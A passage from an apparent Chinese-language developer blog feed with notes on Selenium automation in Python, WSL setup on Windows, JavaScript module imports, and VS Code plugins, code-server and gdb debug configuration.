<h4 id="4-获取父级"><a href="#4-获取父级" class="headerlink" title="(4) 获取父级"></a>(4) 获取父级</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;test&quot;</span>&gt;</span>Geeks For Geeks<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;test&quot;</span>&gt;</span>Geeks For Geeks<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">button = driver.find_element(By.XPATH, <span class="string">&quot;//button[@type=&#x27;button&#x27;]&quot;</span>)</span><br><span class="line">div_par = button.find_element(By.XPATH, <span class="string">&quot;..&quot;</span>)</span><br></pre></td></tr></table></figure>


<h3 id="3-2-CLASS-NAME"><a href="#3-2-CLASS-NAME" class="headerlink" title="3.2. CLASS_NAME"></a>3.2. CLASS_NAME</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xxx</span> <span class="attr">class</span>=<span class="string">&#x27;abc def&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">xxx</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以使用abc也可以使用def</span></span><br><span class="line">xxx = driver.find_element(By.CLASS_NAME, <span class="string">&#x27;abc&#x27;</span>)</span><br><span class="line">xxx = driver.find_element(By.CLASS_NAME, <span class="string">&#x27;def&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="4-等待页面加载完成"><a href="#4-等待页面加载完成" class="headerlink" title="4. 等待页面加载完成"></a>4. 等待页面加载完成</h2><h3 id="4-1-根据特定标签元素进行判断"><a href="#4-1-根据特定标签元素进行判断" class="headerlink" title="4.1. 根据特定标签元素进行判断"></a>4.1. 根据特定标签元素进行判断</h3><ul>
<li>引入WebDriverWait类，超出timeout后抛出异常</li>
<li>默认探测步长<code>0.5s</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WebDriverWait</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, driver, timeout, poll_frequency=POLL_FREQUENCY, ignored_exceptions=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Constructor, takes a WebDriver instance and timeout in seconds.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">           :Args:</span></span><br><span class="line"><span class="string">            - driver - Instance of WebDriver (Ie, Firefox, Chrome or Remote)</span></span><br><span class="line"><span class="string">            - timeout - Number of seconds before timing out</span></span><br><span class="line"><span class="string">            - poll_frequency - sleep interval between calls</span></span><br><span class="line"><span class="string">              By default, it is 0.5 second.</span></span><br><span class="line"><span class="string">            - ignored_exceptions - iterable structure of exception classes ignored during calls.</span></span><br><span class="line"><span class="string">              By default, it contains NoSuchElementException only.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">           Example::</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            from selenium.webdriver.support.wait import WebDriverWait \n</span></span><br><span class="line"><span class="string">            element = WebDriverWait(driver, 10).until(lambda x: x.find_element(By.ID, &quot;someId&quot;)) \n</span></span><br><span class="line"><span class="string">            is_disappeared = WebDriverWait(driver, 30, 1, (ElementNotVisibleException)).\\ \n</span></span><br><span class="line"><span class="string">                        until_not(lambda x: x.find_element(By.ID, &quot;someId&quot;).is_displayed())</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>until()</code>和<code>until_not()</code>两个方法进行判断</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 10s内method成功就返回，否则抛出异常</span></span><br><span class="line">WebDriverWait(driver, <span class="number">10</span>).until(method，message=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># 10s内method不成功就返回，否则抛出异常</span></span><br><span class="line">WebDriverWait(driver, <span class="number">10</span>).until_not(method，message=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>结合<code>expected_conditions</code>来进行判断</li>
</ul>
<p><code>expected_conditions</code>类提供的预期条件判断的方法</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>title_is</td>
<td>判断当前页面的 title 是否完全等于（&#x3D;&#x3D;）预期字符串，返回布尔值</td>
</tr>
<tr>
<td>title_contains</td>
<td>判断当前页面的 title 是否包含预期字符串，返回布尔值</td>
</tr>
<tr>
<td>presence_of_element_located</td>
<td>判断某个元素是否被加到了 dom 树里，并不代表该元素一定可见</td>
</tr>
<tr>
<td>visibility_of_element_located</td>
<td>判断元素是否可见（可见代表元素非隐藏，并且元素宽和高都不等于 0）</td>
</tr>
<tr>
<td>visibility_of</td>
<td>同上一方法，只是上一方法参数为locator，这个方法参数是 定位后的元素</td>
</tr>
<tr>
<td>presence_of_all_elements_located</td>
<td>判断是否至少有 1 个元素存在于 dom 树中。举例：如果页面上有 n 个元素的 class 都是’wp’，那么只要有 1 个元素存在，这个方法就返回 True</td>
</tr>
<tr>
<td>text_to_be_present_in_element</td>
<td>判断某个元素中的 text 是否 包含 了预期的字符串</td>
</tr>
<tr>
<td>text_to_be_present_in_element_value</td>
<td>判断某个元素中的 value 属性是否包含 了预期的字符串</td>
</tr>
<tr>
<td>frame_to_be_available_and_switch_to_it</td>
<td>判断该 frame 是否可以 switch进去，如果可以的话，返回 True 并且 switch 进去，否则返回 False</td>
</tr>
<tr>
<td>invisibility_of_element_located</td>
<td>判断某个元素中是否不存在于dom树或不可见</td>
</tr>
<tr>
<td>element_to_be_clickable</td>
<td>判断某个元素中是否可见并且可点击</td>
</tr>
<tr>
<td>staleness_of</td>
<td>等某个元素从 dom 树中移除，注意，这个方法也是返回 True或 False</td>
</tr>
<tr>
<td>element_to_be_selected</td>
<td>判断某个元素是否被选中了,一般用在下拉列表</td>
</tr>
<tr>
<td>element_selection_state_to_be</td>
<td>判断某个元素的选中状态是否符合预期</td>
</tr>
<tr>
<td>element_located_selection_state_to_be</td>
<td>跟上面的方法作用一样，只是上面的方法传入定位到的 element，而这个方法传入 locator</td>
</tr>
<tr>
<td>alert_is_present</td>
<td>判断页面上是否存在 alert</td>
</tr>
</tbody></table>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20s内等待&lt;xxx class=&#x27;item-list&#x27;&gt;加载到dom树后获取元素#设置等待</span></span><br><span class="line">wait = WebDriverWait(driver, <span class="number">20</span>)</span><br><span class="line">wait.until(EC.presence_of_element_located((By.CLASS_NAME, <span class="string">&quot;item-list&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义判断</span></span><br><span class="line">wait.until(<span class="keyword">lambda</span> diver: driver.find_element(By.CLASS_NAME, <span class="string">&quot;item-list&quot;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="5-鼠标移动点击"><a href="#5-鼠标移动点击" class="headerlink" title="5. 鼠标移动点击"></a>5. 鼠标移动点击</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line">ActionChains(driver).move_by_offset(<span class="number">400</span>, <span class="number">300</span>).perform()     <span class="comment"># 鼠标移动到 (400, 300)</span></span><br><span class="line">ActionChains(driver).click().perform()                      <span class="comment"># 鼠标左键点击</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鼠标移动到元素上面，针对部分悬浮显示的情况</span></span><br><span class="line">ActionChains(driver).move_to_element(element).perform()</span><br></pre></td></tr></table></figure>

<h2 id="6-截图"><a href="#6-截图" class="headerlink" title="6. 截图"></a>6. 截图</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">driver.get_screenshot_as_file(<span class="string">&#x27;test.png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="7-获取标签的属性"><a href="#7-获取标签的属性" class="headerlink" title="7. 获取标签的属性"></a>7. 获取标签的属性</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;/a/b/c.jpg&#x27;</span> <span class="attr">class</span>=<span class="string">&#x27;abc&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>driver.find_element(By.CLASS_NAME, <span class="string">&#x27;abc&#x27;</span>).</span><br></pre></td></tr></table></figure>

<h2 id="8-iframe处理"><a href="#8-iframe处理" class="headerlink" title="8. iframe处理"></a>8. iframe处理</h2><ul>
<li>碰到iframe的时候，无法进行iframe内部的元素查找操作，需要进行切换</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&#x27;dpa&#x27;</span> <span class="attr">...</span>&gt;</span>...<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">driver.switch_to.frame(<span class="string">&#x27;dpa&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="9-页面缩放"><a href="#9-页面缩放" class="headerlink" title="9. 页面缩放"></a>9. 页面缩放</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大于1就是放大，小于1缩小</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>driver.execute_script(<span class="string">&quot;document.body.style.zoom=&#x27;1.5&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="10-表单提交"><a href="#10-表单提交" class="headerlink" title="10. 表单提交"></a>10. 表单提交</h2><ul>
<li>遇到使用<code>&lt;form&gt;</code>标签的</li>
<li>对<code>&lt;input type=&quot;submit&quot;&gt;</code>元素无法点击，可以使用</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>tmp = driver.find_element(By.CLASS_NAME, value=<span class="string">&#x27;submit-button&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tmp.submit()</span><br></pre></td></tr></table></figure>

<h2 id="11-执行js脚本"><a href="#11-执行js脚本" class="headerlink" title="11. 执行js脚本"></a>11. 执行js脚本</h2><h3 id="11-1-语法"><a href="#11-1-语法" class="headerlink" title="11.1. 语法"></a>11.1. 语法</h3><ul>
<li>使用<code>arguments[n]</code>可以取后面的<code>web_element</code>使用</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">driver.execute_script(<span class="string">&#x27;arguments[0].parentNode.removeChild(arguments[0])&#x27;</span>, tmp)</span><br></pre></td></tr></table></figure>

<h3 id="11-2-示例1-删除一个标签"><a href="#11-2-示例1-删除一个标签" class="headerlink" title="11.2. 示例1: 删除一个标签"></a>11.2. 示例1: 删除一个标签</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tmp = driver.find_element(By.CLASS_NAME, <span class="string">&#x27;submit-button&#x27;</span>)</span><br><span class="line">driver.execute_script(<span class="string">&#x27;arguments[0].parentNode.removeChild(arguments[0])&#x27;</span>, tmp)</span><br></pre></td></tr></table></figure>

<h1 id="三、请求相关"><a href="#三、请求相关" class="headerlink" title="三、请求相关"></a>三、请求相关</h1><h2 id="1-seleniumwire获取请求头部信息"><a href="#1-seleniumwire获取请求头部信息" class="headerlink" title="1. seleniumwire获取请求头部信息"></a>1. seleniumwire获取请求头部信息</h2><ul>
<li>selenium不支持获取请求头部信息了，需要使用seleniumwire包</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install selenium-wire</span><br></pre></td></tr></table></figure>

<ul>
<li>获取请求头和响应头部信息</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> seleniumwire <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_argument(<span class="string">&#x27;--ignore-certificate-errors&#x27;</span>)</span><br><span class="line">options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line">wait = WebDriverWait(driver, <span class="number">60</span>)</span><br><span class="line">driver.maximize_window()</span><br><span class="line">driver.get(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> re <span class="keyword">in</span> driver.requests:</span><br><span class="line">    req = <span class="built_in">dict</span>(re.headers)</span><br><span class="line">    res = <span class="built_in">dict</span>(re.response.headers)</span><br><span class="line">    <span class="built_in">print</span>(req)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>auto test</tag>
      </tags>
  </entry>
  <entry>
    <title>windows10/11 wsl使用记录</title>
    <url>/blogs/2022-02-27-wsl/</url>
    <content><![CDATA[<h1 id="一、问题-解决"><a href="#一、问题-解决" class="headerlink" title="一、问题&amp;解决"></a>一、问题&amp;解决</h1><h2 id="1-无法访问主机网络"><a href="#1-无法访问主机网络" class="headerlink" title="1. 无法访问主机网络"></a>1. 无法访问主机网络</h2><ul>
<li>使用powershell管理员执行下面命令添加防火墙，允许所有的wsl的网卡接入</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">PS&gt; New-NetFirewallRule -DisplayName &quot;WSL2&quot; -Direction Inbound -InterfaceAlias &quot;vEthernet (WSL)&quot; -Action Allow</span><br></pre></td></tr></table></figure>

<h2 id="2-GUI界面"><a href="#2-GUI界面" class="headerlink" title="2. GUI界面"></a>2. GUI界面</h2><ul>
<li>wsl2在win11上自带gui，不需要安装xfce4等桌面环境</li>
<li>直接使用powershell执行下面语句获取gui特性</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">PS&gt; wsl --update</span><br></pre></td></tr></table></figure>

<ul>
<li>然后在开始菜单输入ubuntu，就可以看到ubuntu的gui应用，点击就可以打开，第一次启动较慢</li>
</ul>
<h2 id="3-切换版本"><a href="#3-切换版本" class="headerlink" title="3. 切换版本"></a>3. 切换版本</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 设置默认版本</span><br><span class="line">PS&gt; wsl --<span class="built_in">set</span>-default-version <span class="number">2</span></span><br><span class="line">:: 设置某个发行版版本</span><br><span class="line">PS&gt; wsl --<span class="built_in">set</span>-version Ubuntu <span class="number">2</span></span><br><span class="line">:: 查看各个发行版版本</span><br><span class="line">PS&gt; wsl -l -v</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>前端的javascript笔记</title>
    <url>/blogs/2022-02-22-javascript/</url>
    <content><![CDATA[<h1 id="一、语法"><a href="#一、语法" class="headerlink" title="一、语法"></a>一、语法</h1><h2 id="1-import导入js文件"><a href="#1-import导入js文件" class="headerlink" title="1. import导入js文件"></a>1. import导入js文件</h2><h3 id="1-1-export和import"><a href="#1-1-export和import" class="headerlink" title="1.1. export和import"></a>1.1. export和import</h3><ul>
<li>使用<code>export default</code>直接导出</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> testObj = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">testFunc</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    testObj,</span><br><span class="line">    testFunc,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> data <span class="keyword">from</span> <span class="string">&#x27;/path/to/xxx.js&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    data.<span class="title function_">testFunc</span>(data.<span class="property">testObj</span>.<span class="property">a</span>, data.<span class="property">testObj</span>.<span class="property">b</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>vscode使用技巧记录</title>
    <url>/blogs/2022-02-15-vscode/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><ul>
<li>据说是宇宙第一IDE，反正vim搞不定的我就用vscode</li>
</ul>
<h1 id="二、下载加速"><a href="#二、下载加速" class="headerlink" title="二、下载加速"></a>二、下载加速</h1><ul>
<li>将下载链接的地址替换为国内镜像地址<code>vscode.cdn.azure.cn</code>即可</li>
</ul>
<h1 id="三、好用的插件"><a href="#三、好用的插件" class="headerlink" title="三、好用的插件"></a>三、好用的插件</h1><h2 id="1-跨平台快捷键不一致"><a href="#1-跨平台快捷键不一致" class="headerlink" title="1. 跨平台快捷键不一致"></a>1. 跨平台快捷键不一致</h2><ul>
<li>在windows上使用习惯的快捷键在linux不适用</li>
<li>安装一个<code>windows default keybinding</code>就好了</li>
</ul>
<h2 id="2-16进制查看文件"><a href="#2-16进制查看文件" class="headerlink" title="2. 16进制查看文件"></a>2. 16进制查看文件</h2><ul>
<li><code>hexdump for vscode</code></li>
</ul>
<h2 id="3-cmake"><a href="#3-cmake" class="headerlink" title="3. cmake"></a>3. cmake</h2><ul>
<li><code>CMake</code>: cmake语言支持</li>
<li><code>CMake Tools</code>: vscode界面的cmake工具</li>
</ul>
<h3 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h3><h4 id="1-tool-kits一直没更新"><a href="#1-tool-kits一直没更新" class="headerlink" title="(1) tool kits一直没更新"></a>(1) tool kits一直没更新</h4><ul>
<li>安装了新的gcc，scan之后没有更新</li>
<li>删除<code>/home/sangfor/.local/share/CMakeTools/cmake-tools-kits.json</code>的内容，重新扫描即可</li>
</ul>
<h2 id="3-remote-ssh"><a href="#3-remote-ssh" class="headerlink" title="3. remote-ssh"></a>3. remote-ssh</h2><h3 id="3-1-服务端组件离线下载地址"><a href="#3-1-服务端组件离线下载地址" class="headerlink" title="3.1. 服务端组件离线下载地址"></a>3.1. 服务端组件离线下载地址</h3><ul>
<li>linux: <code>https://vscode.cdn.azure.cn/stable/(xxx)/vscode-server-linux-x64.tar.gz</code></li>
</ul>
<h2 id="4-Draw-io-画图插件"><a href="#4-Draw-io-画图插件" class="headerlink" title="4. Draw.io 画图插件"></a>4. Draw.io 画图插件</h2><h2 id="5-vscode-mindmap-思维导图"><a href="#5-vscode-mindmap-思维导图" class="headerlink" title="5. vscode-mindmap 思维导图"></a>5. vscode-mindmap 思维导图</h2><h1 id="四、code-server-web版vscode"><a href="#四、code-server-web版vscode" class="headerlink" title="四、code-server web版vscode"></a>四、code-server web版vscode</h1><ul>
<li>这个东西对付没有界面的服务器又不想在本地安装vscode的很好用</li>
</ul>
<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><ul>
<li>直接下载release包运行即可，<a href="https://github.com//coder/code-server/releases">地址</a></li>
<li>archlinux可以使用<code>yay</code>进行安装</li>
</ul>
<h2 id="2-配置"><a href="#2-配置" class="headerlink" title="2. 配置"></a>2. 配置</h2><ul>
<li>linux配置文件在<code>~/.config/code-server/config.yaml</code></li>
<li>默认仅提供<code>127.0.0.1</code>的访问，想要外部访问需要配置<code>bind-addr</code>为<code>0.0.0.0:8080</code></li>
</ul>
<h2 id="3-使用nginx进行转发，websocket失败导致无法使用"><a href="#3-使用nginx进行转发，websocket失败导致无法使用" class="headerlink" title="3. 使用nginx进行转发，websocket失败导致无法使用"></a>3. 使用nginx进行转发，websocket失败导致无法使用</h2><ul>
<li>参考<a href="/blogs/2021-04-23-nginx/#1-3-%E6%94%AF%E6%8C%81websocket">nginx支持websocket</a></li>
</ul>
<h2 id="4-arm上安装后无法使用"><a href="#4-arm上安装后无法使用" class="headerlink" title="4. arm上安装后无法使用"></a>4. arm上安装后无法使用</h2><p><strong>报错如下</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cannot find module &#x27;@node-rs/argon2-linux-arm64-gnu&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>解决办法</strong></p>
<ul>
<li>下载<code>https://registry.yarnpkg.com/@node-rs/argon2-linux-arm64-gnu/-/argon2-linux-arm64-gnu-1.1.0.tgz</code></li>
<li>解压替换到<code>/usr/lib/code-server/node_modules/@node-rs/argon2-linux-arm64-gnu</code>即可</li>
</ul>
<h2 id="5-无法选中粘贴"><a href="#5-无法选中粘贴" class="headerlink" title="5. 无法选中粘贴"></a>5. 无法选中粘贴</h2><ul>
<li>web版限制了http访问的部分粘贴功能，需要开启https访问即可</li>
</ul>
<h1 id="五、调试配置-launch-json"><a href="#五、调试配置-launch-json" class="headerlink" title="五、调试配置 launch.json"></a>五、调试配置 launch.json</h1><ul>
<li><p><a href="https://code.visualstudio.com/docs/editor/variables-reference">json中可用的内置变量</a></p>
</li>
<li><p><code>$&#123;workspaceFolder&#125;</code> - the path of the folder opened in VS Code</p>
</li>
<li><p><code>$&#123;workspaceFolderBasename&#125;</code> - the name of the folder opened in VS Code without any slashes (&#x2F;)</p>
</li>
<li><p><code>$&#123;file&#125;</code> - the current opened file</p>
</li>
<li><p><code>$&#123;fileWorkspaceFolder&#125;</code> - the current opened file’s workspace folder</p>
</li>
<li><p><code>$&#123;relativeFile&#125;</code> - the current opened file relative to workspaceFolder</p>
</li>
<li><p><code>$&#123;relativeFileDirname&#125;</code> - the current opened file’s dirname relative to workspaceFolder</p>
</li>
<li><p><code>$&#123;fileBasename&#125;</code> - the current opened file’s basename</p>
</li>
<li><p><code>$&#123;fileBasenameNoExtension&#125;</code> - the current opened file’s basename with no file extension</p>
</li>
<li><p><code>$&#123;fileDirname&#125;</code> - the current opened file’s dirname</p>
</li>
<li><p><code>$&#123;fileExtname&#125;</code> - the current opened file’s extension</p>
</li>
<li><p><code>$&#123;cwd&#125;</code> - the task runner’s current working directory upon the startup of VS Code</p>
</li>
<li><p><code>$&#123;lineNumber&#125;</code> - the current selected line number in the active file</p>
</li>
<li><p><code>$&#123;selectedText&#125;</code> - the current selected text in the active file</p>
</li>
<li><p><code>$&#123;execPath&#125;</code> - the path to the running VS Code executable</p>
</li>
<li><p><code>$&#123;defaultBuildTask&#125;</code> - the name of the default build task</p>
</li>
<li><p><code>$&#123;pathSeparator&#125;</code> - the character used by the operating system to separate components in file paths</p>
</li>
</ul>
<h2 id="1-gdb"><a href="#1-gdb" class="headerlink" title="1. gdb"></a>1. gdb</h2><h3 id="1-1-配置"><a href="#1-1-配置" class="headerlink" title="1.1. 配置"></a>1.1. 配置</h3><h4 id="1-launch"><a href="#1-launch" class="headerlink" title="1) launch"></a>1) launch</h4><h5 id="1-本地起程序"><a href="#1-本地起程序" class="headerlink" title="(1) 本地起程序"></a>(1) 本地起程序</h5><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// Use IntelliSense to learn about possible attributes.</span></span><br><span class="line">    <span class="comment">// Hover to view descriptions of existing attributes.</span></span><br><span class="line">    <span class="comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/build/run&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="comment">// 参数</span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>        <span class="comment">// 系统环境变量使用name和value模式指定</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LD_LIBRARY_PATH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/third-party/openssl/&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/gdb&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="2-连接远程服务器"><a href="#2-连接远程服务器" class="headerlink" title="(2) 连接远程服务器"></a>(2) 连接远程服务器</h5><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;(gdb) Attach&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/build/runtime_output_directory/mysqld&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;miDebuggerServerAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:6666&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Enable pretty-printing for gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ignoreFailures&quot;</span><span 